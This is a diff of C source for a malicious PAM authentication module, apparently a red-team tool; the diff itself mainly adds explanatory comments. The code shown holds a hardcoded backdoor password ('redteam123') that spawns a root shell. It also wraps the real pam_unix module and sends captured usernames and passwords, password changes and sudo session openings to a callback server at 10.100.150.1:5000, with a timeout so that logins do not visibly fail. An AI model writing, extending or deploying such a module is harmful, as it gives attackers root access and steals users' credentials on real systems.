@@ -16,15 +16,19 @@
 #include <netinet/in.h>
 #include <ifaddrs.h>
 
+// PAM module backup path
 #define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
+// Bypass Auth Password (setup in setup.py)
 #define AUTH_PASSWORD "redteam123"
 
+// Callback IP, Port, and return format (setup in setup.py)
 #define CALLBACK_IP "10.100.150.1"
 #define CALLBACK_PORT 5000
 #define RET_FMT "%s - %s %s:%s\n"
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
+// Helper function to get local IP address for use in the callback message
 int get_local_ip(char *buffer, size_t buflen) {
     struct ifaddrs *ifaddr, *ifa;
     int family;
@@ -33,6 +37,7 @@ int get_local_ip(char *buffer, size_t buflen) {
         return -1;  // Failed to get interfaces
     }
 
+    // Iterate over addresses and return not the loopback address
     for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
         if (ifa->ifa_addr == NULL) continue;
 
@@ -55,11 +60,13 @@ int get_local_ip(char *buffer, size_t buflen) {
 // Function to send data to the c2 server (mainly username:password combinations)
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
 
+    // Get IP using helper function
     char ipaddr[INET_ADDRSTRLEN];
     if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
         return 1;
     }
 
+    // Create socket with timeout so if firewall rules stop this module from connecting, it doesn't stop authentication
     struct timeval timeout;
     timeout.tv_sec = 3; // 10 seconds
     timeout.tv_usec = 0; // 0 microseconds
@@ -142,6 +149,7 @@ int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int a
         return PAM_AUTH_ERR;
     }
 
+    // Get function from loaded module
     pam_func_t func = (pam_func_t)dlsym(handle, name);
     if (!func) {
         pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
@@ -158,9 +166,11 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     const char *username;
     const char *password;
 
+    // Get username and password from PAM handler
     pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
+    // If password == AUTH_PASSWORD, give root shell
     if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
         setuid(0);
         setgid(0);
@@ -178,6 +188,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     //     return PAM_SUCCESS;
     // }
 
+    // If authentication is successful, send creds to server using pam_send_authtok
     int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
 
     if (username && password && retval == PAM_SUCCESS) {
@@ -196,6 +207,7 @@ PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const c
 
     int retval = pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
 
+    // If password is successfully changed, send password using pam_send_authtok
     if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
     }
@@ -222,6 +234,7 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
         struct passwd *caller_pw = getpwuid(caller_uid);
         const char *calling_user = caller_pw ? caller_pw->pw_name : "UNKNOWN";
 
+        // If the target UID is 0 and the caller UID is greater than this, it must be a sudo session opening (user must be admin)
         if (target_uid == 0 && caller_uid > target_uid) {
             pam_send_authtok(pamh, "SUDO SESSION OPENED:", calling_user, ":");
         }
@@ -230,10 +243,12 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
     return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
 }
 
+// Doesn't really matter for what this does (needs to be set though for proxy to work)
 PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return pam_unix_authenticate("pam_sm_close_session", pamh, flags, argc, argv);
 }
 
+// Doesn't really matter for what this does (needs to be set though for proxy to work)
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return pam_unix_authenticate("pam_sm_setcred", pamh, flags, argc, argv);
 }
